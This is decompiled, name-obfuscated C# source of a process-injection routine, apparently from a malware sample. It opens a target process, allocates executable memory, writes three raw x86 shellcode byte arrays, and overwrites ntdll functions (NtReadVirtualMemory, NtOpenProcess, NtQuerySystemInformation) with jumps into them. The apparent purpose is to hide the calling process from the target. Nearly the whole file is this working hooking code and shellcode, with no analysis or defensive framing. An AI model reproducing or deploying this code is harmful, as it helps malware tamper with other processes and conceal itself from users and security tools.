using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace lowFQsJSlrFgr
{
	// Token: 0x0200001B RID: 27
	internal sealed class Memory
	{
		// Token: 0x0600008B RID: 139
		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern bool CloseHandle(IntPtr intptr_0);

		// Token: 0x0600008C RID: 140
		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr OpenProcess(int int_0, bool bool_0, uint uint_0);

		// Token: 0x0600008D RID: 141
		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern bool ReadProcessMemory(IntPtr cqfndObvnDEeza, IntPtr jBacZZFJtjKoa, [Out] byte[] UtYgjauGymkL, uint ZePFJgitRBK, ref uint eeAfUdgXhvsJT);

		// Token: 0x0600008E RID: 142
		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern bool WriteProcessMemory(IntPtr intptr_0, IntPtr intptr_1, byte[] byte_0, uint uint_0, ref uint uint_1);

		// Token: 0x0600008F RID: 143
		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern bool VirtualProtectEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, uint uint_1, ref uint uint_2);

		// Token: 0x06000090 RID: 144
		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern bool Module32Next(IntPtr intptr_0, ref Memory.kKiURvoHFZukizJ kKiURvoHFZukizJ_0);

		// Token: 0x06000091 RID: 145
		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern bool Module32First(IntPtr intptr_0, ref Memory.kKiURvoHFZukizJ kKiURvoHFZukizJ_0);

		// Token: 0x06000092 RID: 146
		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr CreateToolhelp32Snapshot(uint uint_0, uint uint_1);

		// Token: 0x06000093 RID: 147
		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr VirtualAllocEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, uint uint_1, uint uint_2);

		// Token: 0x06000094 RID: 148
		private static byte[] ReadData(IntPtr intptr_0, IntPtr intptr_1, uint uint_0)
		{
			byte[] array = new byte[checked((int)(unchecked((ulong)uint_0) - 1UL) + 1)];
			byte[] utYgjauGymkL = array;
			uint num = 0u;
			Memory.ReadProcessMemory(intptr_0, intptr_1, utYgjauGymkL, uint_0, ref num);
			return array;
		}

		// Token: 0x06000095 RID: 149
		private static uint MemoryOP(IntPtr intptr_0, uint uint_0, string string_0)
		{
			checked
			{
				uint num = BitConverter.ToUInt32(Memory.ReadData(intptr_0, (IntPtr)((long)(unchecked((ulong)uint_0) + 60UL)), 4u), 0);
				uint num2 = BitConverter.ToUInt32(Memory.ReadData(intptr_0, (IntPtr)((long)(unchecked((ulong)(checked(uint_0 + num))) + 120UL)), 4u), 0);
				byte[] value = Memory.ReadData(intptr_0, (IntPtr)((long)(unchecked((ulong)(checked(uint_0 + num2))))), 40u);
				int num3 = BitConverter.ToInt32(value, 24);
				uint num4 = BitConverter.ToUInt32(value, 32) + uint_0;
				uint num5 = BitConverter.ToUInt32(value, 28) + uint_0;
				uint num6 = BitConverter.ToUInt32(value, 36) + uint_0;
				IntPtr intPtr = Marshal.AllocHGlobal(64);
				int num7 = num3;
				int num8 = 1;
				uint result;
				for (;;)
				{
					int num9 = num8;
					int num10 = num7;
					if (num9 > num10)
					{
						break;
					}
					uint num11 = BitConverter.ToUInt32(Memory.ReadData(intptr_0, (IntPtr)((long)(unchecked((ulong)num4) + (ulong)(unchecked((long)(checked((num8 - 1) * 4)))))), 4u), 0);
					Marshal.Copy(Memory.ReadData(intptr_0, (IntPtr)((long)(unchecked((ulong)(checked(uint_0 + num11))))), 64u), 0, intPtr, 64);
					string strA = Marshal.PtrToStringAnsi(intPtr);
					uint num12 = (uint)BitConverter.ToInt16(Memory.ReadData(intptr_0, (IntPtr)((long)(unchecked((ulong)num6) + (ulong)(unchecked((long)(checked((num8 - 1) * 2)))))), 2u), 0);
					result = BitConverter.ToUInt32(Memory.ReadData(intptr_0, (IntPtr)((long)(unchecked((ulong)num5) + unchecked((ulong)num12) * 4UL)), 4u), 0) + uint_0;
					if (string.Compare(strA, string_0, true) == 0)
					{
						goto IL_163;
					}
					num8++;
				}
				Marshal.FreeHGlobal(intPtr);
				return 0u;
				IL_163:
				Marshal.FreeHGlobal(intPtr);
				return result;
			}
		}

		// Token: 0x06000096 RID: 150
		private static IntPtr ParseProcess(string string_0, string string_1)
		{
			checked
			{
				IntPtr intPtr = Memory.CreateToolhelp32Snapshot(24u, (uint)Process.GetProcessesByName(string_0)[0].Id);
				IntPtr zero = IntPtr.Zero;
				IntPtr result;
				if (intPtr == zero)
				{
					result = zero;
				}
				else
				{
					Memory.kKiURvoHFZukizJ structure = default(Memory.kKiURvoHFZukizJ);
					structure.ONWwedZZuSlfT = (uint)Marshal.SizeOf<Memory.kKiURvoHFZukizJ>(structure);
					if (Memory.Module32First(intPtr, ref structure))
					{
						while (structure.cuaUPxUKGKphwT.ToInt64() > 2147483647L || string.Compare(string_1, structure.PagqcqSGcV, true) != 0)
						{
							if (!Memory.Module32Next(intPtr, ref structure))
							{
								goto IL_A3;
							}
						}
						return structure.cuaUPxUKGKphwT;
					}
					IL_A3:
					result = zero;
				}
				return result;
			}
		}

		// Token: 0x06000097 RID: 151
		private static int CheckedIT(int int_0, int int_1)
		{
			return checked(int_0 - int_1 - 5);
		}

		// Token: 0x06000098 RID: 152
		public static void Init(string string_0)
		{
			byte[] array = new byte[97];
			uint[] array2 = new uint[4];
			byte[][] array3 = new byte[4][];
			uint num = 0u;
			byte[] array4 = new byte[5];
			array4[0] = 233;
			byte[] array5 = array4;
			byte[][] array6 = new byte[][]
			{
				Memory.DZxtIitbpJsIPE,
				Memory.WKhTEbOwSmjen,
				Memory.tbKNmFyDWybjv
			};
			uint num2;
			IntPtr intPtr;
			uint num3;
			uint value;
			uint value2;
			checked
			{
				num2 = (uint)(array6[0].Length + array6[1].Length + array6[2].Length);
				intPtr = Memory.OpenProcess(56, false, (uint)Process.GetProcessesByName(string_0)[0].Id);
				IntPtr zero = IntPtr.Zero;
				num3 = (uint)((int)Memory.VirtualAllocEx(intPtr, zero, (uint)(unchecked((ulong)num2) + 96UL), 12288u, 64u));
				value = (uint)((int)Memory.MemoryOP(intPtr, (uint)((int)Memory.ParseProcess(string_0, "kernel32.dll")), "GetProcessId"));
				value2 = (uint)((int)Memory.MemoryOP(intPtr, (uint)((int)Memory.ParseProcess(string_0, "kernel32.dll")), "GetCurrentProcessId"));
				array2[0] = (uint)((int)Memory.MemoryOP(intPtr, (uint)((int)Memory.ParseProcess(string_0, "ntdll.dll")), "NtReadVirtualMemory"));
				array2[1] = (uint)((int)Memory.MemoryOP(intPtr, (uint)((int)Memory.ParseProcess(string_0, "ntdll.dll")), "NtOpenProcess"));
				array2[2] = (uint)((int)Memory.MemoryOP(intPtr, (uint)((int)Memory.ParseProcess(string_0, "ntdll.dll")), "NtQuerySystemInformation"));
			}
			array3[0] = Memory.ReadData(intPtr, (IntPtr)((long)((ulong)array2[0])), 24u);
			array3[1] = Memory.ReadData(intPtr, (IntPtr)((long)((ulong)array2[1])), 24u);
			array3[2] = Memory.ReadData(intPtr, (IntPtr)((long)((ulong)array2[2])), 24u);
			BitConverter.GetBytes(value).CopyTo(array, 0);
			BitConverter.GetBytes(value2).CopyTo(array, 4);
			BitConverter.GetBytes(Process.GetCurrentProcess().Id).CopyTo(array, 8);
			BitConverter.GetBytes(array2[0]).CopyTo(array, 12);
			BitConverter.GetBytes(array2[1]).CopyTo(array, 16);
			BitConverter.GetBytes(array2[2]).CopyTo(array, 20);
			array3[0].CopyTo(array, 24);
			array3[1].CopyTo(array, 48);
			array3[2].CopyTo(array, 72);
			uint num4 = num3;
			IntPtr intptr_ = intPtr;
			IntPtr intptr_2 = (IntPtr)((long)((ulong)num4));
			byte[] byte_ = array;
			uint num5 = 0u;
			Memory.WriteProcessMemory(intptr_, intptr_2, byte_, 96u, ref num5);
			checked
			{
				num4 = (uint)(unchecked((ulong)num4) + 96UL);
				int num6 = array6.Length - 1;
				int num7 = 0;
				for (;;)
				{
					int num8 = num7;
					int num9 = num6;
					if (num8 > num9)
					{
						break;
					}
					IntPtr intptr_3 = intPtr;
					IntPtr intptr_4 = (IntPtr)((long)(unchecked((ulong)num4)));
					byte[] byte_2 = array6[num7];
					uint uint_ = (uint)array6[num7].Length;
					num5 = 0u;
					Memory.WriteProcessMemory(intptr_3, intptr_4, byte_2, uint_, ref num5);
					num4 = (uint)(unchecked((ulong)num4) + (ulong)(unchecked((long)array6[num7].Length)));
					num7++;
				}
				IntPtr intptr_5 = intPtr;
				IntPtr intptr_6 = (IntPtr)((long)(unchecked((ulong)num3)));
				uint uint_2 = (uint)(unchecked((ulong)num2) + 96UL);
				num5 = 0u;
				Memory.VirtualProtectEx(intptr_5, intptr_6, uint_2, 16u, ref num5);
				num4 = (uint)(unchecked((ulong)num3) + 96UL);
				BitConverter.GetBytes(Memory.CheckedIT((int)num4, (int)array2[0])).CopyTo(array5, 1);
				Memory.VirtualProtectEx(intPtr, (IntPtr)((long)(unchecked((ulong)array2[0]))), (uint)array5.Length, 64u, ref num);
				IntPtr intptr_7 = intPtr;
				IntPtr intptr_8 = (IntPtr)((long)(unchecked((ulong)array2[0])));
				byte[] byte_3 = array5;
				uint uint_3 = (uint)array5.Length;
				num5 = 0u;
				Memory.WriteProcessMemory(intptr_7, intptr_8, byte_3, uint_3, ref num5);
				IntPtr intptr_9 = intPtr;
				IntPtr intptr_10 = (IntPtr)((long)(unchecked((ulong)array2[0])));
				uint uint_4 = (uint)array5.Length;
				uint uint_5 = num;
				num5 = 0u;
				Memory.VirtualProtectEx(intptr_9, intptr_10, uint_4, uint_5, ref num5);
				num4 = (uint)(unchecked((ulong)num4) + (ulong)(unchecked((long)array6[0].Length)));
				BitConverter.GetBytes(Memory.CheckedIT((int)num4, (int)array2[1])).CopyTo(array5, 1);
				Memory.VirtualProtectEx(intPtr, (IntPtr)((long)(unchecked((ulong)array2[1]))), (uint)array5.Length, 64u, ref num);
				IntPtr intptr_11 = intPtr;
				IntPtr intptr_12 = (IntPtr)((long)(unchecked((ulong)array2[1])));
				byte[] byte_4 = array5;
				uint uint_6 = (uint)array5.Length;
				num5 = 0u;
				Memory.WriteProcessMemory(intptr_11, intptr_12, byte_4, uint_6, ref num5);
				IntPtr intptr_13 = intPtr;
				IntPtr intptr_14 = (IntPtr)((long)(unchecked((ulong)array2[1])));
				uint uint_7 = (uint)array5.Length;
				uint uint_8 = num;
				num5 = 0u;
				Memory.VirtualProtectEx(intptr_13, intptr_14, uint_7, uint_8, ref num5);
				num4 = (uint)(unchecked((ulong)num4) + (ulong)(unchecked((long)array6[1].Length)));
				BitConverter.GetBytes(Memory.CheckedIT((int)num4, (int)array2[2])).CopyTo(array5, 1);
				Memory.VirtualProtectEx(intPtr, (IntPtr)((long)(unchecked((ulong)array2[2]))), (uint)array5.Length, 64u, ref num);
				IntPtr intptr_15 = intPtr;
				IntPtr intptr_16 = (IntPtr)((long)(unchecked((ulong)array2[2])));
				byte[] byte_5 = array5;
				uint uint_9 = (uint)array5.Length;
				num5 = 0u;
				Memory.WriteProcessMemory(intptr_15, intptr_16, byte_5, uint_9, ref num5);
				IntPtr intptr_17 = intPtr;
				IntPtr intptr_18 = (IntPtr)((long)(unchecked((ulong)array2[2])));
				uint uint_10 = (uint)array5.Length;
				uint uint_11 = num;
				num5 = 0u;
				Memory.VirtualProtectEx(intptr_17, intptr_18, uint_10, uint_11, ref num5);
				Memory.CloseHandle(intPtr);
			}
		}

		// Token: 0x04000074 RID: 116
		private static byte[] DZxtIitbpJsIPE = new byte[]
		{
			85,
			139,
			236,
			131,
			236,
			20,
			86,
			199,
			69,
			248,
			1,
			0,
			0,
			192,
			232,
			0,
			0,
			0,
			0,
			88,
			37,
			0,
			240,
			byte.MaxValue,
			byte.MaxValue,
			137,
			69,
			252,
			byte.MaxValue,
			117,
			24,
			byte.MaxValue,
			117,
			20,
			byte.MaxValue,
			117,
			16,
			byte.MaxValue,
			117,
			12,
			byte.MaxValue,
			117,
			8,
			139,
			69,
			252,
			131,
			192,
			24,
			byte.MaxValue,
			208,
			137,
			69,
			248,
			131,
			125,
			248,
			0,
			15,
			140,
			168,
			0,
			0,
			0,
			byte.MaxValue,
			117,
			8,
			139,
			69,
			252,
			byte.MaxValue,
			16,
			139,
			240,
			139,
			69,
			252,
			byte.MaxValue,
			80,
			4,
			59,
			240,
			116,
			10,
			131,
			125,
			8,
			byte.MaxValue,
			15,
			133,
			138,
			0,
			0,
			0,
			131,
			101,
			244,
			0,
			235,
			7,
			139,
			69,
			244,
			64,
			137,
			69,
			244,
			131,
			125,
			244,
			3,
			115,
			119,
			139,
			69,
			244,
			139,
			77,
			252,
			131,
			124,
			129,
			12,
			0,
			116,
			101,
			139,
			69,
			244,
			139,
			77,
			252,
			139,
			68,
			129,
			12,
			59,
			69,
			12,
			114,
			86,
			139,
			69,
			12,
			3,
			69,
			20,
			139,
			77,
			244,
			139,
			85,
			252,
			57,
			68,
			138,
			12,
			115,
			68,
			139,
			69,
			244,
			139,
			77,
			252,
			139,
			68,
			129,
			12,
			43,
			69,
			12,
			137,
			69,
			240,
			131,
			101,
			236,
			0,
			235,
			7,
			139,
			69,
			236,
			64,
			137,
			69,
			236,
			131,
			125,
			236,
			24,
			115,
			33,
			139,
			69,
			244,
			107,
			192,
			24,
			139,
			77,
			252,
			141,
			68,
			1,
			24,
			139,
			77,
			236,
			3,
			77,
			240,
			139,
			85,
			16,
			139,
			117,
			236,
			138,
			4,
			48,
			136,
			4,
			10,
			235,
			210,
			233,
			124,
			byte.MaxValue,
			byte.MaxValue,
			byte.MaxValue,
			139,
			69,
			248,
			94,
			201,
			194,
			20,
			0
		};

		// Token: 0x04000075 RID: 117
		private static byte[] WKhTEbOwSmjen = new byte[]
		{
			85,
			139,
			236,
			81,
			81,
			199,
			69,
			248,
			1,
			0,
			0,
			192,
			232,
			0,
			0,
			0,
			0,
			88,
			37,
			0,
			240,
			byte.MaxValue,
			byte.MaxValue,
			137,
			69,
			252,
			131,
			125,
			20,
			0,
			116,
			22,
			139,
			69,
			20,
			139,
			77,
			252,
			139,
			0,
			59,
			65,
			8,
			117,
			9,
			199,
			69,
			248,
			34,
			0,
			0,
			192,
			235,
			23,
			byte.MaxValue,
			117,
			20,
			byte.MaxValue,
			117,
			16,
			byte.MaxValue,
			117,
			12,
			byte.MaxValue,
			117,
			8,
			139,
			69,
			252,
			131,
			192,
			48,
			byte.MaxValue,
			208,
			137,
			69,
			248,
			139,
			69,
			248,
			201,
			194,
			16,
			0
		};

		// Token: 0x04000076 RID: 118
		private static byte[] tbKNmFyDWybjv = new byte[]
		{
			85,
			139,
			236,
			131,
			236,
			28,
			86,
			87,
			199,
			69,
			236,
			1,
			0,
			0,
			192,
			232,
			0,
			0,
			0,
			0,
			88,
			37,
			0,
			240,
			byte.MaxValue,
			byte.MaxValue,
			137,
			69,
			240,
			byte.MaxValue,
			117,
			20,
			byte.MaxValue,
			117,
			16,
			byte.MaxValue,
			117,
			12,
			byte.MaxValue,
			117,
			8,
			139,
			69,
			240,
			131,
			192,
			72,
			byte.MaxValue,
			208,
			137,
			69,
			236,
			131,
			125,
			236,
			0,
			15,
			140,
			78,
			1,
			0,
			0,
			131,
			125,
			8,
			5,
			117,
			93,
			131,
			101,
			248,
			0,
			139,
			69,
			12,
			137,
			69,
			244,
			139,
			69,
			244,
			131,
			56,
			0,
			116,
			70,
			139,
			69,
			244,
			137,
			69,
			248,
			139,
			69,
			248,
			139,
			77,
			248,
			3,
			8,
			137,
			77,
			244,
			139,
			69,
			244,
			139,
			77,
			240,
			139,
			64,
			68,
			59,
			65,
			8,
			117,
			37,
			139,
			69,
			244,
			131,
			56,
			0,
			117,
			8,
			139,
			69,
			248,
			131,
			32,
			0,
			235,
			15,
			139,
			69,
			248,
			139,
			0,
			139,
			77,
			244,
			3,
			1,
			139,
			77,
			248,
			137,
			1,
			139,
			69,
			248,
			137,
			69,
			244,
			235,
			178,
			233,
			235,
			0,
			0,
			0,
			131,
			125,
			8,
			16,
			15,
			133,
			225,
			0,
			0,
			0,
			139,
			69,
			12,
			137,
			69,
			252,
			131,
			101,
			232,
			0,
			235,
			7,
			139,
			69,
			232,
			64,
			137,
			69,
			232,
			139,
			69,
			252,
			139,
			77,
			232,
			59,
			8,
			15,
			131,
			192,
			0,
			0,
			0,
			139,
			69,
			232,
			193,
			224,
			4,
			139,
			77,
			252,
			139,
			85,
			240,
			139,
			68,
			1,
			4,
			59,
			66,
			8,
			15,
			133,
			162,
			0,
			0,
			0,
			139,
			69,
			232,
			193,
			224,
			4,
			139,
			77,
			252,
			198,
			68,
			1,
			9,
			0,
			139,
			69,
			232,
			193,
			224,
			4,
			139,
			77,
			252,
			131,
			100,
			1,
			16,
			0,
			139,
			69,
			232,
			193,
			224,
			4,
			51,
			201,
			139,
			85,
			252,
			102,
			137,
			76,
			2,
			10,
			139,
			69,
			232,
			193,
			224,
			4,
			139,
			77,
			252,
			131,
			100,
			1,
			12,
			0,
			139,
			69,
			232,
			193,
			224,
			4,
			139,
			77,
			252,
			198,
			68,
			1,
			8,
			0,
			139,
			69,
			232,
			193,
			224,
			4,
			139,
			77,
			252,
			131,
			100,
			1,
			4,
			0,
			139,
			69,
			232,
			137,
			69,
			228,
			235,
			7,
			139,
			69,
			228,
			64,
			137,
			69,
			228,
			139,
			69,
			252,
			139,
			77,
			228,
			59,
			8,
			115,
			33,
			139,
			69,
			228,
			64,
			193,
			224,
			4,
			139,
			77,
			252,
			141,
			116,
			1,
			4,
			139,
			69,
			228,
			193,
			224,
			4,
			139,
			77,
			252,
			141,
			124,
			1,
			4,
			165,
			165,
			165,
			165,
			235,
			206,
			139,
			69,
			252,
			139,
			0,
			72,
			139,
			77,
			252,
			137,
			1,
			139,
			69,
			232,
			72,
			137,
			69,
			232,
			233,
			43,
			byte.MaxValue,
			byte.MaxValue,
			byte.MaxValue,
			139,
			69,
			236,
			95,
			94,
			201,
			194,
			16,
			0
		};

		// Token: 0x0200001C RID: 28
		public struct kKiURvoHFZukizJ
		{
			// Token: 0x04000077 RID: 119
			public uint ONWwedZZuSlfT;

			// Token: 0x04000078 RID: 120
			public uint ZJrcbcSzWFZe;

			// Token: 0x04000079 RID: 121
			public uint SLxhlqYKxeDhXdoh;

			// Token: 0x0400007A RID: 122
			public uint QtsrtVnuFo;

			// Token: 0x0400007B RID: 123
			public uint dxpsMZRJClYYIH;

			// Token: 0x0400007C RID: 124
			public IntPtr cuaUPxUKGKphwT;

			// Token: 0x0400007D RID: 125
			public uint dLTsoKeiuRjEJR;

			// Token: 0x0400007E RID: 126
			public IntPtr xPAhFQjWtYKL;

			// Token: 0x0400007F RID: 127
			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
			public string PagqcqSGcV;

			// Token: 0x04000080 RID: 128
			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
			public string MwSBnQitIpxLL;
		}
	}
}
